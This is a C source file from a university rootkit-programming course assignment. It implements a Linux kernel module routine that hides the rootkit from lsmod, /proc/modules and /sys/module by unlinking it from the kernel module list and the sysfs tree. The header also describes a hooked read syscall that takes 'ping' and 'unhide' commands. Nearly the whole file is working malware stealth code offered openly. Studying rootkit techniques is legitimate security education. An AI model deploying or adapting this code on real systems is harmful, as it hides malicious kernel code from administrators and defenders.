
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 7                                                             */
/*                                                                             */
/*   Filename: module_masking.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: December 2015                                                       */
/*                                                                             */
/*   Usage: This module is hiding itself in the kernel context. Specifically,  */
/*          it does not show up in /sys/module or in the output of lsmod.      */
/*          Additionaly, it hooks the read system call and if the user types   */
/*          `ping` the rootkit responds with `pong` in the kernel log. This    */
/*          mecahnism is used to check if the rootkit is running. In order to  */
/*          unload the module, the module needs to become visible again.       */
/*          Therefore, the read system call is hooked to look for yet another  */
/*          command, called `unhide`, which makes the module visible.          */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/list.h>			/* Needed for linked list interface */


/*******************************************************************************/
/*                                                                             */
/*                       DEFINITIONS - DECLARATIONS                            */
/*                                                                             */
/*******************************************************************************/


/* Definition of macros */
#define PRINT(str) printk(KERN_INFO "rootkit module_masking: %s\n", (str))
#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)


/* Definition of global variables */
static int show_debug_messages;
static int module_is_hidden;	/* Current state of module (1 ~> hidden) */
static struct list_head *module_prev;


/* Declaration of functions */
int module_masking_init(int);
int module_masking_exit(void);

void mask_module(void);
void unmask_module(void);

/* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
static bool kernfs_unlink_sibling(struct kernfs_node *);
static int kernfs_link_sibling(struct kernfs_node *);


/*******************************************************************************/
/*                                                                             */
/*                                  CODE                                       */
/*                                                                             */
/*******************************************************************************/


/* Initialization function */
int module_masking_init(int debug_mode_on)
{
	show_debug_messages = debug_mode_on;

	mask_module();

	DEBUG_PRINT("initialized");

	return 0;
}


int module_masking_exit(void)
{
	unmask_module();

	DEBUG_PRINT("exited");

	return 0;
}


/* Hide module from /sys/module and from the output of lsmod. Do so by
   removing entries of our module from kernel data structures */
void mask_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	module_is_hidden = 1;

	/* All kernel modules are associated with a unique struct module structure. These
       structures are maintained in a global list (specifically a doubly linked list).
       Any newly created module will be added to the head of the list. The struct module
       structure of our module is found under the macro THIS_MODULE. We remove our module
       structure from the list, so it does not appear in /proc/modules and lsmod. We store
       a reference of the previous node in the list, so we can add in its correct position
       in the list when we need to make the module visible again. Keep in mind that when
       the module is absent form the list, it cannot be uninstalled. */
	module_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	/* sysfs is a virtual file system provided by the Linux kernel. Every kernel module is
       associated with a struct kobject which represents a kernel object and shows up as
       directory in the sysfs filesystem (found under /sys/module). Kernel objects are kept
       in a memory resident data structure (specifically a red-black tree). We remove the
       kernel object associated with our module from that data structure, so it does not
       appear in /sys/module. */
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	/* THIS_MODULE is of type: struct module - mkobj is of type: struct module_kobject -
       kobj is of type: struct kobject - sd is of type: struct kernfs_node*/
	kernfs_unlink_sibling(kernfs_node_ptr);

	DEBUG_PRINT("hiding mode on");
}


/* Unhide module from /sys/module and from the output of lsmod, so it becomes
   unloadable. Do so by re-adding entries of our module to kernel data structures */
void unmask_module(void)
{
	struct kernfs_node *kernfs_node_ptr;

	if (!module_is_hidden)
		return;

	module_is_hidden = 0;

	/* We add our module structure to the global list of loaded kernel modules, so it
       does appear in /proc/modules and lsmod. We add it to its initial position in
       the list (right after its previous node) */
	list_add(&THIS_MODULE->list, module_prev);

	/* We add the kernel object associated with our kernel module to the memory resident
       data structure of kernel objects. It will now appear in /sys/module. */
	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
	kernfs_link_sibling(kernfs_node_ptr);

	DEBUG_PRINT("hiding mode off");

	/* The module is now visible in /sys/module and lsmod and can now be removed */
}


/*******************************************************************************/
/*                                                                             */
/*          CODE BELOW IS TAKEN FROM fs/kernfs/dir.c, lines 224-321            */
/*                                                                             */
/*******************************************************************************/

static int kernfs_name_compare(unsigned int hash, const char *name,
                               const void *ns, const struct kernfs_node *kn)
{
	if (hash < kn->hash)
		return -1;
	if (hash > kn->hash)
		return 1;
	if (ns < kn->ns)
		return -1;
	if (ns > kn->ns)
		return 1;
	return strcmp(name, kn->name);
}

static int kernfs_sd_compare(const struct kernfs_node *left,
                             const struct kernfs_node *right)
{
	return kernfs_name_compare(left->hash, left->name, left->ns, right);
}

/**
 *      kernfs_link_sibling - link kernfs_node into sibling rbtree
 *      @kn: kernfs_node of interest
 *
 *      Link @kn into its sibling rbtree which starts from
 *      @kn->parent->dir.children.
 *
 *      Locking:
 *      mutex_lock(kernfs_mutex)
 *
 *      RETURNS:
 *      0 on susccess -EEXIST on failure.
 */
static int kernfs_link_sibling(struct kernfs_node *kn)
{
	struct rb_node **node = &kn->parent->dir.children.rb_node;
	struct rb_node *parent = NULL;

	while (*node) {
		struct kernfs_node *pos;
		int result;

		//pos = rb_to_kn(*node);
		pos = rb_entry(*node, struct kernfs_node, rb);
		parent = *node;
		result = kernfs_sd_compare(kn, pos);
		if (result < 0)
			node = &pos->rb.rb_left;
		else if (result > 0)
			node = &pos->rb.rb_right;
		else
			return -EEXIST;
	}

	/* add new node and rebalance the tree */
	rb_link_node(&kn->rb, parent, node);
	rb_insert_color(&kn->rb, &kn->parent->dir.children);

	/* successfully added, account subdir number */
	if (kernfs_type(kn) == KERNFS_DIR)
		kn->parent->dir.subdirs++;

	return 0;
}

/**
 *      kernfs_unlink_sibling - unlink kernfs_node from sibling rbtree
 *      @kn: kernfs_node of interest
 *
 *      Try to unlink @kn from its sibling rbtree which starts from
 *      kn->parent->dir.children.  Returns %true if @kn was actually
 *      removed, %false if @kn wasn't on the rbtree.
 *
 *      Locking:
 *      mutex_lock(kernfs_mutex)
 */
static bool kernfs_unlink_sibling(struct kernfs_node *kn)
{
	if (RB_EMPTY_NODE(&kn->rb))
		return false;

	if (kernfs_type(kn) == KERNFS_DIR)
		kn->parent->dir.subdirs--;

	rb_erase(&kn->rb, &kn->parent->dir.children);
	RB_CLEAR_NODE(&kn->rb);
	return true;
}

/*******************************************************************************/
